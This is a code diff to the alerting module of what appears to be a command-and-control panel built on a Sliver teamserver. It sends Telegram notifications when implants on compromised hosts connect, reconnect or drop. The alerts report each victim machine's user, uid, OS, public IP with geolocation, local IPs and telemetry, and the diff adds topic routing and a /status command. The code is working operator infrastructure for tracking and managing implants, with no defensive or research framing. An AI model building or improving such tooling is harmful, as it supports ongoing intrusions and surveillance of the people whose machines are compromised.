@@ -29,20 +29,13 @@ TELEMETRY_DELAY = 10
 BLOCK_LIMIT = 3500
 ALERT_TTL = 86400
 PANELUP_WINDOW = 300
-HEALTH_INTERVAL = int(os.environ.get("PANEL_HEALTH_INTERVAL", "3600") or "3600")
+HEALTH_INTERVAL = int(os.environ.get("PANEL_HEALTH_INTERVAL", "21600") or "21600")
+RETURN_TTL = int(os.environ.get("PANEL_RETURN_TTL", "21600") or "21600")
+LOST_DELAY = int(os.environ.get("PANEL_LOST_DELAY", "120") or "120")
+LOST_TTL = int(os.environ.get("PANEL_LOST_TTL", "3600") or "3600")
+TELEMETRY_ON = os.environ.get("PANEL_TELEMETRY", "0") not in {"0", "false", "no"}
 
-FP_FIELDS = (
-    "host",
-    "user",
-    "os",
-    "arch",
-    "integrity",
-    "transport",
-    "remote_address",
-    "reconnect_interval",
-    "active_c2",
-    "pid",
-)
+FP_FIELDS = ("host", "user", "os", "arch", "integrity")
 
 
 def fingerprint(session: dict) -> str:
@@ -59,7 +52,10 @@ class Alerts:
         self._seen: set[str] = set()
         self._task: asyncio.Task[None] | None = None
         self._health_task: asyncio.Task[None] | None = None
+        self._topic_task: asyncio.Task[None] | None = None
+        self._cmd_task: asyncio.Task[None] | None = None
         self._tasks: set[asyncio.Task[None]] = set()
+        self._lost_tasks: dict[str, asyncio.Task[None]] = {}
         self._geo_cache: dict[str, dict[str, str]] = {}
 
     def start(self) -> None:
@@ -67,6 +63,94 @@ class Alerts:
             self._task = asyncio.create_task(self._run())
         if self._health_task is None:
             self._health_task = asyncio.create_task(self._health_loop())
+        if self._topic_task is None:
+            self._topic_task = asyncio.create_task(asyncio.to_thread(self._setup_topics))
+        if self._cmd_task is None:
+            self._cmd_task = asyncio.create_task(self._command_loop())
+
+    # -- topic/chat routing --------------------------------------------------
+    def _target(self, category: str) -> tuple[str, int]:
+        cfg = self.config
+        if category == "health":
+            chat = cfg.tg_chat_health or cfg.tg_chat_id
+            thread = cfg.tg_thread_health
+        elif category == "new":
+            chat = cfg.tg_chat_new or cfg.tg_chat_id
+            thread = cfg.tg_thread_new
+        elif category == "returning":
+            chat = cfg.tg_chat_returning or cfg.tg_chat_id
+            thread = cfg.tg_thread_returning
+        else:
+            chat, thread = cfg.tg_chat_id, 0
+        if not thread:
+            stored = self.db.kv_get(f"tg:thread:{category}")
+            if stored:
+                with contextlib.suppress(ValueError):
+                    thread = int(stored)
+        return chat, thread
+
+    def _send(self, category: str, html: str, caption: str = "") -> None:
+        chat, thread = self._target(category)
+        self.tg.send(html, caption=caption, chat_id=chat, thread_id=thread)
+
+    def _setup_topics(self) -> None:
+        """Create Health / New / Returning topics when the chat is a forum."""
+        if not self.tg.enabled:
+            return
+        for category, name in (
+            ("health", "\U0001fa7a Health"),
+            ("new", "\U0001f7e2 New Implants"),
+            ("returning", "\U0001f501 Returning Implants"),
+        ):
+            _chat, thread = self._target(category)
+            if thread:
+                continue
+            chat = self._target(category)[0]
+            info = self.tg.chat_info(chat)
+            if not (info.get("is_forum") or info.get("type") == "supergroup"):
+                continue
+            tid = self.tg.create_topic(name, chat)
+            if tid:
+                self.db.kv_set(f"tg:thread:{category}", str(tid))
+                log.info("telegram topic %s -> %s", category, tid)
+
+    async def _command_loop(self) -> None:
+        """Answer /health or /status in the operator chat: live status on demand."""
+        if not self.tg.enabled:
+            return
+        import httpx
+
+        offset = 0
+        allowed = {
+            str(self.config.tg_chat_id),
+            str(self.config.tg_chat_health),
+            str(self.config.tg_chat_new),
+            str(self.config.tg_chat_returning),
+        }
+        allowed.discard("")
+        while True:
+            try:
+                async with httpx.AsyncClient(timeout=40.0) as client:
+                    resp = await client.get(
+                        f"https://api.telegram.org/bot{self.tg.token}/getUpdates",
+                        params={
+                            "timeout": 25,
+                            "offset": offset,
+                            "allowed_updates": '["message"]',
+                        },
+                    )
+                    data = resp.json()
+                for update in data.get("result", []) or []:
+                    offset = max(offset, int(update.get("update_id", 0)) + 1)
+                    message = update.get("message") or {}
+                    chat = str((message.get("chat") or {}).get("id", ""))
+                    text = str(message.get("text") or "").strip().lower().split("@")[0]
+                    if chat in allowed and text in ("/health", "/status", "health", "status"):
+                        with contextlib.suppress(Exception):
+                            await self._emit_health()
+            except Exception as exc:
+                log.debug("telegram command loop: %s", exc)
+                await asyncio.sleep(5)
 
     # -- dedup ---------------------------------------------------------------
     def _should_alert(self, session: dict) -> str | None:
@@ -82,11 +166,17 @@ class Alerts:
                 state = json.loads(previous)
             except ValueError:
                 state = {}
-            if state.get("fp") == fp and now - float(state.get("ts", 0)) < ALERT_TTL:
-                return None
-            changed = state.get("fp") != fp
+            if state.get("fp") == fp:
+                if now - float(state.get("ts", 0)) < ALERT_TTL:
+                    return None
+                last_return = float(self.db.kv_get(f"alert:return:{host}") or 0)
+                if now - last_return < RETURN_TTL:
+                    return None
+                self.db.kv_set(f"alert:return:{host}", str(int(now)))
+                self.db.kv_set(key, json.dumps({"fp": fp, "ts": now}))
+                return "returning"
             self.db.kv_set(key, json.dumps({"fp": fp, "ts": now}))
-            return "changed" if changed else "new"
+            return "changed"
         self.db.kv_set(key, json.dumps({"fp": fp, "ts": now}))
         return "new"
 
@@ -119,27 +209,48 @@ class Alerts:
         sid = session.get("id")
         if not sid:
             return
+        host = str(session.get("host") or sid)
         if kind == "session-connected":
+            pending = self._lost_tasks.pop(host, None)
+            if pending is not None:
+                pending.cancel()
             decision = self._should_alert(session)
             if decision is None:
                 return
             self._seen.add(sid)
-            await self._enriched_alert(session, decision == "changed")
-            task = asyncio.create_task(self._telemetry(sid))
-            self._tasks.add(task)
-            task.add_done_callback(self._tasks.discard)
+            await self._enriched_alert(session, decision)
+            if TELEMETRY_ON:
+                task = asyncio.create_task(self._telemetry(sid))
+                self._tasks.add(task)
+                task.add_done_callback(self._tasks.discard)
         elif kind == "session-disconnected":
             self._seen.discard(sid)
-            # one "lost" per disconnect episode; reset the fingerprint so a later
-            # reconnect is treated as new again only if the content changed.
-            down_key = f"alert:down:{sid}"
-            if self.db.kv_get(down_key):
+            if host in self._lost_tasks:
                 return
-            self.db.kv_set(down_key, str(int(time.time())))
-            self.tg.send(
-                f"\U0001f534 <b>IMPLANT LOST</b>\n{escape(session.get('host', '?'))}\n"
-                f"<code>{escape(sid)}</code>"
-            )
+            task = asyncio.create_task(self._lost_later(host, session))
+            self._lost_tasks[host] = task
+            task.add_done_callback(lambda _t, h=host: self._lost_tasks.pop(h, None))
+
+    async def _lost_later(self, host: str, session: dict) -> None:
+        """Only report a loss if the host hasn't reconnected within LOST_DELAY."""
+        await asyncio.sleep(LOST_DELAY)
+        try:
+            sessions = await asyncio.to_thread(self.bridge.sessions)
+        except BridgeError:
+            sessions = []
+        if any(str(item.get("host")) == host for item in sessions):
+            return
+        key = f"alert:down:host:{host}"
+        now = time.time()
+        last = float(self.db.kv_get(key) or 0)
+        if now - last < LOST_TTL:
+            return
+        self.db.kv_set(key, str(int(now)))
+        self._send(
+            "returning",
+            f"\U0001f534 <b>IMPLANT LOST</b>\n{escape(host)}\n"
+            f"<code>{escape(str(session.get('id', '')))}</code>",
+        )
 
     # -- messages ------------------------------------------------------------
     def panel_start(self) -> None:
@@ -149,16 +260,17 @@ class Alerts:
         if last and now - float(last) < PANELUP_WINDOW:
             return
         self.db.kv_set(key, str(int(now)))
-        self.tg.send(
+        self._send(
+            "health",
             f"\U0001f7e2 <b>panel up</b>\noperator: {escape(self.config.panel_user)}\n"
             f"host: {escape(self.config.public_host)}"
         )
 
     def login_burst(self, count: int) -> None:
-        self.tg.send(f"\U0001f7e1 <b>failed logins</b>\n{count} failures in 5 min")
+        self._send("health", f"\U0001f7e1 <b>failed logins</b>\n{count} failures in 5 min")
 
     def crash(self, reason: str) -> None:
-        self.tg.send(f"\U0001f534 <b>panel crash</b>\n{escape(reason[:400])}")
+        self._send("health", f"\U0001f534 <b>panel crash</b>\n{escape(reason[:400])}")
 
     # -- enriched implant alert ---------------------------------------------
     def _geo(self, ip: str) -> dict[str, str]:
@@ -203,7 +315,7 @@ class Alerts:
             ips.extend(iface.get("ips") or [])
         return [ip for ip in ips if ip and not ip.startswith("127.")]
 
-    async def _enriched_alert(self, session: dict, changed: bool) -> None:
+    async def _enriched_alert(self, session: dict, decision: str) -> None:
         remote = str(session.get("remote_address", "")).split(":")[0]
         geo = await asyncio.to_thread(self._geo, remote)
         local_ips = await self._local_ips(session["id"])
@@ -219,7 +331,15 @@ class Alerts:
         user = escape(session.get("user", "?"))
         uid = f"{session.get('uid', '-')}:{session.get('gid', '-')}"
         osarch = f"{session.get('os', '?')} {session.get('arch', '?')}"
-        header = "\U0001f504 <b>IMPLANT CHANGED</b>" if changed else "\U0001f7e2 <b>NEW IMPLANT</b>"
+        if decision == "new":
+            header = "\U0001f7e2 <b>NEW IMPLANT</b>"
+            category = "new"
+        elif decision == "changed":
+            header = "\U0001f504 <b>IMPLANT CHANGED</b>"
+            category = "returning"
+        else:
+            header = "\U0001f501 <b>IMPLANT BACK ONLINE</b>"
+            category = "returning"
         lines = [
             header,
             f"<b>host</b> {host} | <b>user</b> {user} | <b>uid</b> {uid}",
@@ -245,7 +365,7 @@ class Alerts:
         last = session.get("last_checkin", "?")
         fname = escape(session.get("filename", "-"))
         lines.append(f"<b>core</b> first {first} | last {last} | {fname}")
-        self.tg.send("\n".join(lines))
+        self._send(category, "\n".join(lines))
 
     def db_set_ip(self, session_id: str, public_ip: str, local_ips: str) -> None:
         with self.db.connect() as conn:
@@ -273,7 +393,7 @@ class Alerts:
         if not blocks:
             return
         for chunk in _split("\n".join(blocks), BLOCK_LIMIT):
-            self.tg.send(chunk, caption=f"telemetry {session_id[:8]}")
+            self._send("new", chunk, caption=f"telemetry {session_id[:8]}")
 
     # -- periodic health -----------------------------------------------------
     async def _health_loop(self) -> None:
@@ -305,15 +425,17 @@ class Alerts:
         previous = self.db.kv_get("alert:health") or ""
 
         if problems and state != previous:
-            self.tg.send(
+            self._send(
+                "health",
                 "\u267b\ufe0f <b>RESTART NEEDED</b>\n"
                 + escape(state)
                 + "\nrecovery: systemctl restart fleet-panel fleet-bridge fleet-sliver"
             )
         self.db.kv_set("alert:health", state)
 
-        mark = "🟢" if not problems else "🟠"
-        self.tg.send(
+        mark = "\u2705" if not problems else "\u26a0\ufe0f"
+        self._send(
+            "health",
             f"{mark} <b>health</b>\n"
             f"teamserver: {'up' if connected else 'DOWN'}\n"
             f"sessions: {sessions}\n"
